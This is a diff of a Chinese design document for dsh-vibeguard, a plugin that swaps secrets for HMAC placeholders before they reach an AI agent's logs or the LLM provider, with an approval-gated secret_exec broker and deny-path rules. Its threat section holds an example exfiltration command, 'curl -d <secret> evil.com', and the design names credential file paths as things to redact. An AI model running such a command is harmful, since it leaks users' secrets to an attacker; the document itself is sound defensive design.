@@ -1,85 +1,99 @@
 # DESIGN.md — dsh-vibeguard 设计
 
-本文记录持久的设计决策;与代码冲突时以代码为准。
+dsh-vibeguard 是 DSH(DeepSeek Harness)host 端 Cordis 插件:在秘密写入会话日志**之前**替换为内容寻址占位符(`__REDACTED_<NAME>_<hmac12>__`),LLM 与遥测只见占位符,真值只留在本机;broker 工具 `secret_exec` 是唯一的还原出口。本文记录持久的设计决策、不变量与被否决的备选;README 管"怎么用",本文管"为什么这样"。与代码冲突时以代码为准。
 
 ## 威胁模型
 
-本机可信(日志明文可接受),LLM 提供商与遥测后端不可信(出境即泄露,提供商可能留存)。安全目标单一:**原始秘密永远不出境**。参考 vibeguard(Legit Security)与 opencode-vibeguard 的非对称视图(用户看真值、LLM 看占位符)。
+本机可信(日志明文可接受),LLM 提供商与遥测后端不可信(出境即泄露,提供商可能留存)。安全目标单一:**原始秘密永远不出境**。威胁模型参考 vibeguard(Legit Security)与 opencode-vibeguard 的非对称视图(用户看真值、LLM 看占位符),但二者的落地架构在 DSH 的挂点契约下都不成立(见拦截点与 broker 两节)。
 
-## 为什么脱敏必须在写日志之前
+占位符文本本身出境,因此占位符不得携带任何原文信息:无原文前缀、HMAC 抗字典验证(见核心机制)。本地 transcript 里同样是占位符——在"本机可信"模型下这是知情接受的代价,顺带换来日志被分享/上传时天然脱敏。
 
-DSH 把"发给 LLM 的请求"定义为**会话日志的纯函数**,且在 `llm/stream` / `agent/request` 钩子上深冻结——契约明确"listeners read it, never rewrite it"。opencode-vibeguard 那种"本地存明文、每请求出站前重扫脱敏"的架构在 DSH 里不存在挂点。因此脱敏边界前移:**凡写入会话日志的入口**(工具结果 `tools/post-execute`、用户消息 `agent/pre-step`、run_code 子调用日志 `tools/code-dispatch-log`)先替换再提交。日志即占位符,之后所有请求/重试/replay/会话恢复/subagent fork 自动继承干净内容,脱敏一次永久生效。
+## 不变量
 
-代价:本地 transcript 里也是占位符。在"本机可信"模型下这是可接受的——查真值走 map.jsonl;顺带日志被分享/上传时天然脱敏。
+- **真值永不写入会话日志与遥测**:脱敏发生在所有落日志入口之前(拦截点架构),遥测出站另有兜底重扫。
+- **可兑现 ⟺ 真值在本会话、本进程里真实流经过**:映射是会话作用域的内存表,进程死即蒸发;从旧日志或别的会话抄来的占位符一律不可兑现。
+- **占位符是进程期内的纯函数**:同一原文在进程期内任何会话、任何挂点得到同一占位符,去重与相等性语义免费。
+- **匿名桶永不解析(fail-closed)**:拿不到会话身份的挂点脱敏照常,但 resolve 永不查询匿名桶。
+- **日志与审批所见即所执行**:不改写已落账的工具参数(reconstructability);还原只发生在 broker 子进程的内存里,日志如实记录带占位符的命令。
 
-## 为什么不做运行期还原
+## 核心机制:内容寻址占位符
 
-`PreToolDecision` 只有 allow/deny/ask,契约明确"Input rewriting is excluded because arguments are already logged and presented",参数在 pre-execute 前深冻结。绕过深冻结是对抗框架(脆弱且随版本漂移)。vibeguard 的"执行前还原参数"在 DSH 公开 API 里无等价物,故不做。模型侧由系统提示词引导:需真值时请用户提供,或用 env 间接引用(`$VAR` 由 shell 在执行时展开,秘密不进上下文)。
+格式为 `__REDACTED_<NAME>_<hmac12>__`,hmac12 = HMAC-SHA256(进程随机密钥, 原文) 的前 12 位 hex;碰撞时追加 `_2`/`_3` 后缀(后缀在 `__` 之前,查找正则容忍 `(?:_\d+)?`)。
 
-## 占位符:内容寻址
-
-`__REDACTED_<NAME>_<hmac12>__`,hmac12 = HMAC-SHA256(per-install 本机密钥, 原文) 前 12 位 hex。
-
-- **纯函数、零上下文**:不依赖会话/env/计数器。同一秘密跨会话、跨重启同占位符,去重与相等性语义免费;脱敏路径纯计算零 I/O;映射存储得以是全局单文件(按会话分片失去意义)。
-- **HMAC 而非裸哈希**:占位符发给不可信的 LLM 提供商;低熵秘密(弱密码类 kv 命中)的裸哈希可被离线字典爆破验证,HMAC 密钥不出本机则连验证都做不到。SHA-256 是无聊但标准的选择;真正的安全参数是 48 bit 截断(生日界 ~2^24 个秘密)与 HMAC 密钥。
-- **碰撞**:同占位符撞不同原文时追加 `_2`/`_3` 后缀(VibeGuard 同策略),后缀在 `__` 之前,查找正则容忍 `(?:_\d+)?`。
-- **NAME**:有序规则表首条命中生效,规则名即类别(`[A-Z0-9_]{2,24}`,zod 校验,非法配置挂载即报错,不静默降级)。完整单词名而非短码——占位符的读者是用户和模型,自解释优先。NAME 标识秘密的**类别**,不标识来源工具或编码;私钥按 armor 形态拆成 `OPENSSH_PRIVATE_KEY`/`PGP_PRIVATE_KEY`/`GENERIC_PEM_PRIVATE_KEY` 三条,因为整个 BEGIN 行被脱敏后,笼统的 `PRIVATE_KEY` 会把形态信息抹掉。兜底前缀统一用 `GENERIC_`("无特定归属的剩余项";`GENERAL` 是"总体的",语义不对)。
+- **纯函数、零上下文**:不依赖会话/env/计数器,脱敏路径纯计算零 I/O;同一秘密在进程期内跨会话、跨挂点同占位符。
+- **HMAC 而非裸哈希**:占位符发给不可信的 LLM 提供商,低熵秘密(弱密码类 kv 命中)的裸哈希可被离线字典爆破验证;HMAC 密钥不出本机则连验证都做不到。SHA-256 是无聊但标准的选择;真正的安全参数是密钥与 48 bit 截断(生日界 ~2^24 个秘密)。
+- **密钥只活在内存**:进程启动时 `randomBytes(32)` 生成,磁盘上没有可偷的材料;重启后连猜测验证的对象都消失(历史占位符永久失联,这是知情接受的代价,见存储一节)。
+- **碰撞策略**:同会话内同一占位符撞到不同原文时追加 `_2`/`_3` 后缀;跨会话别名不做检测(概率 ~10⁻⁷ 量级,且兑现只发生在值真实流过的会话内,别名无安全后果)。
+- **NAME 标识秘密的类别,不标识来源工具或编码**:完整单词名(`[A-Z0-9_]{2,24}`,zod 校验,非法配置挂载即报错,不静默降级),因为脱敏后 NAME 是占位符里唯一存活的语义线索,读者是用户和模型,自解释优先。私钥按 armor 形态拆 `OPENSSH_PRIVATE_KEY`/`PGP_PRIVATE_KEY`/`GENERIC_PEM_PRIVATE_KEY` 三条——整个 BEGIN 行被脱敏后,笼统的 `PRIVATE_KEY` 会把形态信息抹掉。兜底前缀统一 `GENERIC_`("无特定归属的剩余项";`GENERAL` 是"总体的",语义不对)。
 - **不带 DSH 前缀**:`__REDACTED_` + NAME + 12hex 的组合在自然文本中出现概率为零,品牌前缀无防碰撞价值,去掉对模型更自解释。
-- **无原文前缀**:占位符文本会出境,任何前缀都是泄露。区分"新旧 key"这类需求由 hash 的稳定身份承担,不由原文片段承担。
+- **无原文前缀**:占位符会出境,任何原文片段都是泄露;"区分新旧 key"这类需求由 hash 的稳定身份承担,不由原文片段承担。
 
-## 规则集
+## 拦截点架构:为什么脱敏必须在写日志之前
 
-内置规则 = gitleaks 默认集(222 条)+ opencode-vibeguard 配置的校准子集,改写为 JS RegExp(RE2 方言不兼容)。收录原则:结构性前缀规则优先(前缀即身份,误报天然低);关键词锚定规则不收(扫的是 agent 文本不是仓库);通用 kv 规则以 `group` 只脱敏值 + `minLength` 降噪收尾,可按名关。用户规则排在内置之前,可用更具体的 pattern 截胡宽泛内置规则。
+DSH 把"发给 LLM 的请求"定义为**会话日志的纯函数**,且在 `llm/stream` / `agent/request` 钩子上深冻结——契约明确"listeners read it, never rewrite it"。opencode-vibeguard 那种"本地存明文、每请求出站前重扫脱敏"的架构在 DSH 里不存在挂点。因此脱敏边界前移:凡写入会话日志的入口先替换再提交;日志即占位符,之后所有请求/重试/replay/会话恢复/subagent fork 自动继承干净内容,脱敏一次永久生效。
 
-两处相对上游的修正:私钥规则吃到 `-----END-----`(vibeguard 只匹配头行,正文会漏);通用 `sk-` 规则允许 dash(`sk-kimi-…` 形态,vibeguard 的写法会漏)。幂等性由引擎保证:已是占位符的值跳过(kv 规则会把占位符当值二次脱敏)。
+五个挂点各自的角色(互补,不重叠):
 
-**PII 是可选层,默认关闭**(`enabledOptionalRules` 按名启用):PII 与凭据的风险类别不同——长数字 pattern 在编码语境误报率高(时间戳/随机 ID),脱敏又不可还原,若这类数据正是工作内容则全开等于自残。`PII_CN_ID` 用 regex 圈定形态后由 GB 11643 校验位二次验证(随机数字通过率 ~1/11,再叠加日期段合法性,精度接近凭据级);为此引擎支持内置规则携带 `validate` 函数(loader config 是纯 JSON 给不了函数,validate 只存在于内置规则)。`PII_CN_PHONE` 纯 regex。邮箱不收(git log 每条提交都带,误报无药可救)。
+- `tools/post-execute`:主拦截点。工具结果提交会话日志前替换 content 文本块;LLM 请求是会话日志的纯函数且深冻结,这是工具通道唯一的拦截点。未命中时走 `next()` 保持原样;命中时可选附一段 inline 标记告知模型此处发生过脱敏。
+- `agent/pre-step`:用户消息(粘贴的 key 不经过工具)进入 step 前替换;可由 `redactUserMessages` 关闭。
+- `tools/code-dispatch-log`:run_code 子调用的持久化日志副本走独立 waterfall——不拦它,子调用输出里的秘密会绕过 post-execute 落进日志。
+- `session-telemetry/record`:第二条出境通道(遥测后端)的兜底重扫,深度遍历 JSON、字符串值过引擎。拿不到会话身份,记入匿名桶:脱敏生效,永不解析(fail-closed)。
+- `tools/pre-execute`:唯一能返回决策(allow/deny/ask)的挂点,承担敏感路径 deny 与 `secret_exec` 的审批门槛。它**不是**脱敏点:参数此刻已落日志并深冻结,改写通道在架构上不存在(见 broker 一节)。
 
-## 存储:零磁盘状态
+挂点与会话身份:`tools/*` 与 `agent/*` 事件是 scope 过滤派发,root 上下文监听可收所有 agent;各挂点从 `exec.agent.id` / `payload.agent.id` / `dispatch.agent?.id` 取会话标识,映射记入对应会话的桶。另有一段常驻系统提示词(`systemPrompt.section`)告知模型占位符语义:禁止猜测原值、同占位符恒同值、只在真值流经过的活会话里可兑现、需要真值时用 `secret_exec`。
 
-**什么都不落盘。** HMAC key 进程启动时 `randomBytes(32)` 生成,与映射一起只活在内存:映射按 `Agent.id`(= SessionId)分桶,进程死即全部蒸发。
+## 存储与兑现模型:零磁盘,会话作用域
 
-否决的备选:
+**什么都不落盘。** HMAC key 进程启动时随机生成,与映射一起只活在内存;映射按 `Agent.id`(= SessionId)分桶,进程死即全部蒸发。核心不变量:**占位符可兑现 ⟺ 它的真值在本会话、本进程里真实流经过**。否决的备选:
 
 - **持久映射表(append-only 文件)**:broker 工具使占位符成为可兑现凭证后,持久全局映射 = 永久 bearer token——任何会话拿到占位符字符串(旧日志、别的会话)就能兑现真值。给磁盘表加 ACL 也救不了:权限机制失效时表内容仍在,纯攻击面。
-- **持久 HMAC key**:唯一收益是跨重启的占位符稳定(重贴同秘密 → 同一占位符"复活"),不值一个可偷的密钥材料;key 不落地则字典验证威胁连理论路径都不存在。
+- **持久 HMAC key**:唯一收益是跨重启的占位符稳定(重贴同秘密 → 同一占位符"复活"),不值一份可偷的密钥材料;key 不落地则字典验证威胁连理论路径都不存在。
 - **TTL(vibeguard 的 1h)**:引入"会话中途占位符突然不可兑现"的失效模式,换来的驻留窗口收窄在 JS 里本就不彻底(字符串不可变、GC 不清零,做不到用完即擦除)。
 
-代价(知情接受):重启后所有历史占位符永久失联——不可兑现,也不可与新会话关联;旧日志里的占位符就是一次性符号。
-
-映射的会话作用域性质:可兑现 ⟺ 真值在本会话、本进程真实流经过;拿不到会话身份的挂点(遥测兜底)进匿名桶,脱敏生效但永不解析(fail-closed)。跨会话碰撞别名不做检测(~10⁻⁷ 量级,且兑现只发生在值真实流过的会话内,别名无安全后果)。subagent 是独立会话时,父会话看到的子会话占位符不可兑现(fail-closed 方向,接受)。
+代价(知情接受):重启后所有历史占位符永久失联——不可兑现,也不可与新会话关联;旧日志里的占位符就是一次性符号。subagent 是独立会话时,父会话看到的子会话占位符同样不可兑现——fail-closed 方向,接受。
 
 内存安全论证:威胁模型不变(本机可信、出境不可信);host 进程本来就常驻 provider API key(env)、短暂经手脱敏前的明文工具结果,会话表不改变风险量级。残余风险逐项过:swap(macOS 默认加密)、core dump(Node 默认不产生)、同进程恶意插件(它注册一个排前面的 post-execute 监听器就能看到原文,插件信任是既有假设)、bug 把表序列化进日志(闭包私有 + post-execute 自愈重脱敏)。
 
-## 访问控制(tools/pre-execute,src/guard.ts)
-
-deny 匹配是**字段感知**的:只检查各工具的"目标"参数(`command`/`file_path`/`path`/`workdir`/`cwd`/`directory` 等),不对整个参数 JSON 做子串匹配。初版的全 JSON 匹配在实践中立刻误伤——编辑 README 时 new_string 提到 deny 路径字样即被拦;真正的访问语义在目标参数里。目录条目(尾斜杠)对"引用目录本身"的写法用 `value + '/'` 归一匹配,不扩大到兄弟路径。
-
-固有局限(有意的取舍):bash 命令是自由文本,`cat $X`、`cd … && cat …` 这类拼接可绕过子串匹配。deny 防的是"agent 顺手读凭据文件",不是对抗性绕过;真正的兜底仍是 post-execute 脱敏。
-
-**deny 默认空,是纯用户策略入口。** 不加默认拦截项的理由:插件零磁盘状态,没有需要自保护的文件;常见凭据文件(`.credentials.yaml`、`.ssh/id_*`、`.aws/credentials`、`.netrc`)的内容形状全被规则覆盖,路径级拦截对它们是冗余纵深。需要硬保证(即使规则全失效也不许读)的文件由用户按自己的环境配置 `denyPaths`。
-
-为什么不由 DSH 本体做:DSH 的访问控制是模式制沙箱(read-only / workspace-write / danger-full-access,OS 级执行)+ per-call 审批 + guard 扩展点,**没有 per-path deny**;本插件通过 `tools/pre-execute` waterfall 实现的就是 DSH 预留的接缝。若 DSH 将来出正式的 per-path 策略配置,用户应把策略条目迁过去。
-
-## broker 工具:secret_exec(src/broker.ts)
+## broker 工具:secret_exec
 
 ### 为什么不能 hook bash
 
-DSH 工具参数的生命周期:模型发出调用 → 参数先写持久日志+呈现审批界面 → 深冻结 → 才轮到插件钩子。`tools/pre-execute` 只有 allow/deny/ask;`tools/execute` 的 `next()` 不接受参数。改写已落账参数会让日志与审批界面撒谎(reconstructability 不变量),所以该通道在架构上不存在,不是没开放。绕过深冻结或替换官方 bash 行分别是"对抗框架"和"重写整个工具",均不可取。
+DSH 工具参数的生命周期:模型发出调用 → 参数先写持久日志 + 呈现审批界面 → 深冻结 → 才轮到插件钩子。`tools/pre-execute` 只有 allow/deny/ask,`tools/execute` 的 `next()` 不接受参数。改写已落账参数会让日志与审批界面撒谎(reconstructability 不变量),所以该通道在架构上不存在,不是没开放;绕过深冻结或替换官方 bash 分别是"对抗框架"和"重写整个工具",均不可取。同时 `$ENV_VAR` 式间接引用在 DSH 里默认是断的(实测 bash 工具的子进程环境已被 harness 剥掉凭据形状变量),因此"用真值执行命令"必须有一个专用的声明式出口。
 
-### 设计
+### 设计:声明语义
 
-还原做成 secret_exec 的**声明语义**:命令带占位符落日志(干净、可审计),工具实现从**本会话的内存桶**查真值、在子进程内存里替换、spawn 执行,输出先把用过的真值换回占位符(不依赖规则命中)再过引擎(记入本会话桶,因此 broker 输出里新出现的秘密随后也可在本会话兑现)。不可解析的占位符(未知/别会话/重启后)拒绝执行并提示请用户重贴;拿不到会话身份的调用 fail-closed。子进程环境复刻 dsh-subprocess 的 scrub(`/KEY|PASSWORD|SECRET|TOKEN/i` + `DSH_` 前缀不下发)——实测 bash 工具的子进程环境已被 harness 剥掉凭据形状变量,`$ENV_VAR` 式间接引用在 DSH 里默认是断的,broker 因此是"用真值执行"的唯一出口。
+还原不做成隐形改写,而做成本工具的声明语义:命令带占位符落日志(干净、可审计),工具实现从**本会话的内存桶**查真值、在子进程内存里字面替换(`split/join`,防 `$&` 类替换模式特殊字符)、spawn `bash -lc` 执行。真值全程不进上下文、不进日志,只存在于子进程内存;日志与审批界面看到的仍是带占位符的命令。
+
+输出双重脱敏:先把本次用到的真值**直接**换回占位符(不依赖规则命中),再过引擎兜其他秘密(记入本会话桶,因此 broker 输出里新出现的秘密随后也可在本会话兑现)。任一占位符不可解析(未知/别会话/重启后)整体拒绝执行,提示模型请用户重贴;拿不到会话身份的调用直接拒绝——两处都是 fail-closed。`engine.resolve` 通道只对 broker 暴露,模型侧永远拿不到。
 
 ### 威胁语义
 
-- 真值全程不进上下文、不进日志,只存在于子进程内存;审批界面看到的是占位符命令。
-- 占位符是**会话作用域的一次性(进程期)凭证**,不是永久 bearer token:别的会话、旧日志、重启后的占位符都不可兑现(见「存储」节的决策)。
-- 模型可构造外发命令(curl -d <secret> evil.com)——与"用户直接告知密码"同级风险,用 `secretExec.requireApproval`(默认 true,走 DSH 审批流)把人放进环路;approval 策略 never 时自动拒绝。
-- 审计 = 日志里的占位符命令;可兑现性本身即"该秘密在本会话出现过"的证明,无需映射文件。
+占位符是**会话作用域、进程期的一次性凭证**,不是永久 bearer token;别的会话、旧日志、重启后的占位符一律 fail-closed。模型可构造外发命令(`curl -d <secret> evil.com`)——与"用户直接告知密码"同级风险,用 `secretExec.requireApproval`(默认 true,pre-execute 返回 ask 走 DSH 审批流;approval 策略为 never 时自动拒绝)把人放进环路。子进程环境复刻 dsh-subprocess 的 scrub(`/KEY|PASSWORD|SECRET|TOKEN/i` 形状与 `DSH_` 前缀不下发),防 `env` 侧漏。审计 = 日志里的占位符命令;可兑现性本身即"该秘密在本会话出现过"的证明,无需映射文件。
+
+## 访问控制(tools/pre-execute,src/guard.ts)
+
+deny 匹配是**字段感知**的:只检查各工具的"目标"参数(`command`/`file_path`/`path`/`workdir`/`cwd`/`directory`/`root`/`targetDir`/`target`),不对整个参数 JSON 做子串匹配——全 JSON 匹配会把文档内容里的路径字样误判成访问(编辑 README 时 `new_string` 提到 deny 路径即被拦),而真正的访问语义在目标参数里。目录条目(尾斜杠)对"引用目录本身"的写法用 `value + '/'` 归一匹配,不扩大到兄弟路径。
+
+固有局限(有意的取舍):bash 命令是自由文本,`cat $X`、`cd … && cat …` 这类拼接可绕过子串匹配。deny 防的是"agent 顺手读凭据文件",不是对抗性绕过;真正的兜底是 post-execute 脱敏——内容即使被读出来,进日志前也会变占位符。
+
+**deny 默认空,是纯用户策略入口。** 插件零磁盘状态,没有需要自保护的文件;常见凭据文件(`.ssh/id_*`、`.aws/credentials`、`.netrc`)的内容形状全被规则覆盖,路径级拦截对它们是冗余纵深。需要硬保证(即使规则全失效也不许读)的文件由用户按自己的环境配置 `denyPaths`(`~` 展开为 home)。
+
+为什么不由 DSH 本体做:DSH 的访问控制是模式制沙箱(read-only / workspace-write / danger-full-access)+ per-call 审批,**没有 per-path deny**;本插件通过 `tools/pre-execute` waterfall 实现的正是 DSH 预留的接缝。若 DSH 将来出正式的 per-path 策略配置,用户应把策略条目迁过去。
+
+## 规则集(src/patterns.ts)
+
+内置规则 = gitleaks 默认规则集与 opencode-vibeguard 默认配置的校准子集,改写为 JS RegExp(RE2 的 `(?-i:…)`、`[[:alnum:]]`、`\x60` 在 JS 里不存在)。收录原则:结构性前缀规则优先(前缀即身份,误报天然低);关键词锚定规则(要求上下文出现厂商名)不收——本插件扫的是 agent 输入输出文本,不是仓库,噪音收益比不合适;通用 kv 规则收尾(`group` 只脱敏值、保留 `password=` 这类键名语境,`minLength` 剥离引号后计、短值跳过降噪),可按名关。
+
+规则有序、首条命中生效:先命中的规则先把值换成占位符,后续规则看到的是已脱敏文本。用户规则排在内置之前,可用更具体的 pattern 截胡宽泛内置规则。两处相对上游的修正:私钥规则吃到 `-----END-----`(上游只匹配头行,正文会漏);通用 `sk-` 兜底允许 dash(`sk-kimi-…` 形态),排在具体厂商规则之后。幂等性由引擎保证:已是占位符的值跳过(kv 规则会把占位符当值二次脱敏)。
+
+**PII 是可选层,默认关闭**(`enabledOptionalRules` 按名启用):PII 与凭据的风险类别不同——长数字 pattern 在编码语境误报率高(时间戳/随机 ID),脱敏又不可还原,若这类数据正是工作内容(测试 fixture、校验逻辑调试)则全开等于自残。`PII_CN_ID` 用 regex 圈定形态后由 GB 11643 校验位二次验证(随机数字通过率 ~1/11);为此引擎支持内置规则携带 `validate` 函数——loader config 是纯 JSON 给不了函数,validate 只存在于内置规则。`PII_CN_PHONE` 纯 regex。邮箱不收:git log 每条提交都带,误报无药可救。
+
+## 配置面(src/config.ts)
+
+loader 行携带的 config 经 zod schema 解析,非法配置(尤其非法规则名/正则 flags)在挂载时直接报错,不做静默降级——脱敏插件的配置降级是安静的防护失效。细节约束都有占位符机制上的理由:规则名限 `[A-Z0-9_]{2,24}` 是因为它进入占位符文本、必须可被查找正则稳定解析;flags 白名单 `imsuy` 且引擎自行追加 `g`(全局替换是引擎职责);`group` 限 0–9 对应正则捕获组语义。
 
 ## 工程
 
-- rolldown 两产物:`dist/index.js`(host ESM,zod 外置)、`dist/core.js`(纯逻辑,Node 测试 import)。
-- **dist 不进 git**:安装走本地 link(开发)或 npm scoped 包(发布,`prepack` 构建);不经过 github: 通道,因此不需要 stats-compact 的"dist 提交进 git"妥协。
-- 无 client 半(显示还原已论证为净损失:看到真值信息量为零,暴露面为实)。
+- rolldown 两产物:`dist/index.js`(host ESM,zod 外置,运行时从插件 node_modules 解析)与 `dist/core.js`(纯逻辑出口 engine/patterns/broker/guard,供 Node 测试 import)。纯 host 插件,无 client 半——显示还原已论证为净损失(看到真值信息量为零,暴露面为实)。
+- **dist 不进 git**:安装走本地 link(开发)或 npm scoped 包(发布,`prepack` 构建);不经 `github:` 通道,因此不需要"dist 提交进 git"的妥协。
+- 测试是 `test/*.mjs`(engine/broker/guard 三个文件),`pnpm test` 先 build 再逐个 node 执行;引擎的 `seed` 参数专为测试注入预存映射(碰撞后缀等路径在生产中难以触发),生产代码不传。
